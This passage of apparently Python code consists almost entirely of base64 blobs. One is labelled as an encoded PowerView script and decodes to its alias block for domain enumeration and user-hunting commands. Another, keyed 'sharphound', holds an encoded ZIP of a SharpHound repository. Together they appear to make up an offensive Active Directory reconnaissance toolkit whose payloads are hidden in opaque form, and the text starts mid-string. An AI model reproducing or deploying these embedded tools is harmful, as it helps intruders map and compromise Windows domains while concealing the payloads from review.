1Gb3Jlc3RHbG9iYWxDYXRhbG9nClNldC1BbGlhcyBHZXQtTmV0VXNlciBHZXQtRG9tYWluVXNlcgpTZXQtQWxpYXMgR2V0LVVzZXJFdmVudCBHZXQtRG9tYWluVXNlckV2ZW50ClNldC1BbGlhcyBHZXQtTmV0Q29tcHV0ZXIgR2V0LURvbWFpbkNvbXB1dGVyClNldC1BbGlhcyBHZXQtQURPYmplY3QgR2V0LURvbWFpbk9iamVjdApTZXQtQWxpYXMgU2V0LUFET2JqZWN0IFNldC1Eb21haW5PYmplY3QKU2V0LUFsaWFzIEdldC1PYmplY3RBY2wgR2V0LURvbWFpbk9iamVjdEFjbApTZXQtQWxpYXMgQWRkLU9iamVjdEFjbCBBZGQtRG9tYWluT2JqZWN0QWNsClNldC1BbGlhcyBJbnZva2UtQUNMU2Nhbm5lciBGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsClNldC1BbGlhcyBHZXQtR1VJRE1hcCBHZXQtRG9tYWluR1VJRE1hcApTZXQtQWxpYXMgR2V0LU5ldE9VIEdldC1Eb21haW5PVQpTZXQtQWxpYXMgR2V0LU5ldFNpdGUgR2V0LURvbWFpblNpdGUKU2V0LUFsaWFzIEdldC1OZXRTdWJuZXQgR2V0LURvbWFpblN1Ym5ldApTZXQtQWxpYXMgR2V0LU5ldEdyb3VwIEdldC1Eb21haW5Hcm91cApTZXQtQWxpYXMgRmluZC1NYW5hZ2VkU2VjdXJpdHlHcm91cHMgR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwClNldC1BbGlhcyBHZXQtTmV0R3JvdXBNZW1iZXIgR2V0LURvbWFpbkdyb3VwTWVtYmVyClNldC1BbGlhcyBHZXQtTmV0RmlsZVNlcnZlciBHZXQtRG9tYWluRmlsZVNlcnZlcgpTZXQtQWxpYXMgR2V0LURGU3NoYXJlIEdldC1Eb21haW5ERlNTaGFyZQpTZXQtQWxpYXMgR2V0LU5ldEdQTyBHZXQtRG9tYWluR1BPClNldC1BbGlhcyBHZXQtTmV0R1BPR3JvdXAgR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAKU2V0LUFsaWFzIEZpbmQtR1BPTG9jYXRpb24gR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZwpTZXQtQWxpYXMgRmluZC1HUE9Db21wdXRlckFkbWluIEdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nClNldC1BbGlhcyBHZXQtTG9nZ2VkT25Mb2NhbCBHZXQtUmVnTG9nZ2VkT24KU2V0LUFsaWFzIEludm9rZS1DaGVja0xvY2FsQWRtaW5BY2Nlc3MgVGVzdC1BZG1pbkFjY2VzcwpTZXQtQWxpYXMgR2V0LVNpdGVOYW1lIEdldC1OZXRDb21wdXRlclNpdGVOYW1lClNldC1BbGlhcyBHZXQtUHJveHkgR2V0LVdNSVJlZ1Byb3h5ClNldC1BbGlhcyBHZXQtTGFzdExvZ2dlZE9uIEdldC1XTUlSZWdMYXN0TG9nZ2VkT24KU2V0LUFsaWFzIEdldC1DYWNoZWRSRFBDb25uZWN0aW9uIEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uClNldC1BbGlhcyBHZXQtUmVnaXN0cnlNb3VudGVkRHJpdmUgR2V0LVdNSVJlZ01vdW50ZWREcml2ZQpTZXQtQWxpYXMgR2V0LU5ldFByb2Nlc3MgR2V0LVdNSVByb2Nlc3MKU2V0LUFsaWFzIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIE5ldy1UaHJlYWRlZEZ1bmN0aW9uClNldC1BbGlhcyBJbnZva2UtVXNlckh1bnRlciBGaW5kLURvbWFpblVzZXJMb2NhdGlvbgpTZXQtQWxpYXMgSW52b2tlLVByb2Nlc3NIdW50ZXIgRmluZC1Eb21haW5Qcm9jZXNzClNldC1BbGlhcyBJbnZva2UtRXZlbnRIdW50ZXIgRmluZC1Eb21haW5Vc2VyRXZlbnQKU2V0LUFsaWFzIEludm9rZS1TaGFyZUZpbmRlciBGaW5kLURvbWFpblNoYXJlClNldC1BbGlhcyBJbnZva2UtRmlsZUZpbmRlciBGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlClNldC1BbGlhcyBJbnZva2UtRW51bWVyYXRlTG9jYWxBZG1pbiBGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIKU2V0LUFsaWFzIEdldC1OZXREb21haW5UcnVzdCBHZXQtRG9tYWluVHJ1c3QKU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RUcnVzdCBHZXQtRm9yZXN0VHJ1c3QKU2V0LUFsaWFzIEZpbmQtRm9yZWlnblVzZXIgR2V0LURvbWFpbkZvcmVpZ25Vc2VyClNldC1BbGlhcyBGaW5kLUZvcmVpZ25Hcm91cCBHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyClNldC1BbGlhcyBJbnZva2UtTWFwRG9tYWluVHJ1c3QgR2V0LURvbWFpblRydXN0TWFwcGluZwpTZXQtQWxpYXMgR2V0LURvbWFpblBvbGljeSBHZXQtRG9tYWluUG9saWN5RGF0YQo=',  # Base64-encoded PowerView script
    'sharphound': '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